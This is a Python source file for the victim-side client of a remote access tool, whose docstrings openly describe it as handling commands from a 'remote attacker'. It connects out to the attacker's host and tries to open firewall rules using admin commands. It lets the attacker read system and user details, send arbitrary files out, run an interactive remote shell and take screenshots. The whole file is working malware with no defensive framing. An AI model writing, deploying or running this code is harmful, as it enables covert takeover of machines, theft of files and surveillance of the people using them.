import os
import json
import time
import gzip
import base64
import socket
import pickle
import getpass
import platform
import pyautogui
import subprocess

from subprocess import Popen


class TargetHandler:
    """
    A class to handle commands received from a remote attacker.
    """

    def __init__(self, host_ip: str, host_port: int):
        """
        Initializes the TargetHandler object and connects to the attacker.

        Args:
            host_ip (str): The IP address of the attacker.
            host_port (int): The port number to connect to on the attacker's machine.
        """
        self.host_ip = host_ip
        self.host_port = host_port
        self.target = None
        self._connect()

    def _connect(self):
        """
        Establishes a connection to the attacker's machine.
        """
        try:
            self.target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.target.connect((self.host_ip, self.host_port))
            print(f"Connected to {self.host_ip}:{self.host_port}")
        except ConnectionRefusedError:
            print(f"Connection refused by {self.host_ip}:{self.host_port}. Ensure the listener is active.")
            exit()
        except Exception as e:
            print(f"An error occurred during connection: {e}")
            exit()

    def _setup_firewall(self, os_name: str = platform.system()):
        """
        Attempts to set up a firewall rule to allow outgoing connections (requires root/admin privileges).
        Note: This might not always be necessary or successful depending on the target's firewall configuration.

        Args:
            os_name (str, optional): The operating system name ('Windows' or 'Linux' or 'Darwin'). Defaults to platform.system().
        """
        print("Attempting to set up firewall (may require administrator/root privileges)...")
        _p = self.host_port if self.host_port else 4444
        match os_name:
            case 'Windows':
                command = f'netsh advfirewall firewall add rule name="Allow Outbound {_p}" dir=out action=allow protocol=TCP remoteip={self.host_ip} remoteport={_p}'
            case 'Linux':
                command = f'sudo iptables -A OUTPUT -p tcp -d {self.host_ip} --dport {_p} -j ACCEPT'
            case 'Darwin':
                try:
                    with open('/tmp/allow_4444.conf', 'w') as f:
                        f.write('pass out proto tcp from ant to any port 4444\n')
                except PermissionError:
                    print(f'Permission denied for firewall file creation. This error occurs for MacOs.')
                    return
                except FileNotFoundError:
                    print(f'Firewall file creation not found. This error occurs for MacOs.')
                    return
                command = 'sudo pfctl -f /tmp/allow_4444.conf ; sudo pfctl -e'
            case _:
                print(f'Firewall setup not implemented for operating system: {os_name}')
                return
        try:
            subprocess.run(command, shell=True, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("Firewall rule added (if permissions allowed).")
        except Exception as e:
            print(f"Error setting up firewall: {e}. You might need to do this manually.")

    def _file_send(self, file_name: str):
        """
        Sends the content of a file to the connected attacker.

        Args:
            file_name (str): The path to the file to send.
        """
        if not self.target:
            print("No active connection to send file.")
            return

        try:
            with open(file_name, "rb") as file:
                data = file.read()
                time.sleep(0.25)
                batch_size = 1024
                batch_num = len(data) // batch_size
                for i in range(batch_num):
                    batch = data[i * batch_size:(i + 1) * batch_size]
                    self.target.send(batch)
                batch = data[batch_num * batch_size:]
                self.target.send(batch)
                time.sleep(1)
                self.target.send("done".encode())
            print(f"File '{file_name}' sent successfully.")
        except FileNotFoundError:
            print(f"Error: File '{file_name}' not found.")
            self.target.send("Error: File not found".encode())
        except Exception as e:
            print(f"Error sending file '{file_name}': {e}")
            self.target.send(f"Error sending file: {e}".encode())

    def handle_command(self, command: str):
        """
        Handles a single command received from the attacker.

        Args:
            command (str): The command received.
        """
        if command == "info":
            system_info = str(platform.uname())
            self.target.send(system_info.encode())
        elif command == "cwd":
            cwd = os.getcwd()
            self.target.send(cwd.encode())
        elif command == "ls":
            try:
                ls = str(os.listdir(os.getcwd()))
                self.target.send(ls.encode())
            except Exception as e:
                self.target.send(f"Error listing directory: {e}".encode())
        elif "cd" in command:
            try:
                os.chdir(command.split("cd ")[1])
                self.target.send("1".encode())
            except FileNotFoundError:
                self.target.send("0".encode())
            except Exception as e:
                self.target.send(f"Error changing directory: {e}".encode())
        elif command == "user":
            user = getpass.getuser()
            self.target.send(user.encode())
        elif command.split(" ")[0] == "get":
            file_name = command.split("get ")[1]
            print(f"Attacker requested file: {file_name}")
            self._file_send(file_name)
        elif command == "shell":
            self._handle_shell()
        elif command == "screenshot":
            self._handle_screenshot()
        elif command == "q" or command == "quit":
            self.close_connection()
            return False
        else:
            self.target.send(f"Unknown command: {command}".encode())
        return True

    def _handle_shell(self):
        """
        Handles the 'shell' command, allowing interactive shell access.
        """
        global process
        if not self.target:
            print("No active connection for shell.")
            return

        try:
            process: Popen[bytes] = subprocess.Popen(['cmd'] if platform.system() == 'Windows' else ['/bin/sh'],
                                                     stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                                     stderr=subprocess.PIPE)
            print("Interactive shell started.")
            while True:
                receive_cmd = self.target.recv(1024).decode()
                if receive_cmd == "quit":
                    print("Attacker exited the shell.")
                    break
                elif receive_cmd:
                    process.stdin.write(receive_cmd.encode())
                    process.stdin.write(b'\n')
                    process.stdin.flush()
                    output = process.stdout.readline().decode(errors='ignore')  # Handle potential encoding issues
                    compressed_output = gzip.compress(pickle.dumps(output))
                    self.target.send(compressed_output)
        except Exception as e:
            print(f"Error during shell interaction: {e}")
        finally:
            if 'process' in locals() and process.poll() is None:
                process.terminate()

    def _handle_screenshot(self):
        """
        Handles the 'screenshot' command, capturing and sending a screenshot.
        """
        if not self.target:
            print("No active connection to send screenshot.")
            return

        try:
            print("Taking screenshot...")
            screenshot = pyautogui.screenshot()
            temp_file = "temp_screenshot.png"
            screenshot.save(temp_file)
            self._file_send(temp_file)
            os.remove(temp_file)
            print("Screenshot sent.")
        except Exception as e:
            print(f"Error taking or sending screenshot: {e}")
            if os.path.exists("temp_screenshot.png"):
                os.remove("temp_screenshot.png")
            self.target.send(f"Error taking screenshot: {e}".encode())

    def close_connection(self):
        """
        Closes the connection with the attacker.
        """
        if self.target:
            print("Closing connection.")
            self.target.close()
            self.target = None

    def run(self):
        """
        Main loop to receive and handle commands from the attacker.
        """
        if not self.target:
            print("Target handler not properly initialized.")
            return

        try:
            while True:
                try:
                    receive = self.target.recv(1024).decode()
                    if not receive:
                        print("Connection closed by attacker.")
                        break
                    print(f"Received command: {receive}")
                    if not self.handle_command(receive):
                        break
                except ConnectionResetError:
                    print("Connection reset by attacker.")
                    break
                except Exception as e:
                    print(f"An error occurred while receiving data: {e}")
                    break
        finally:
            self.close_connection()
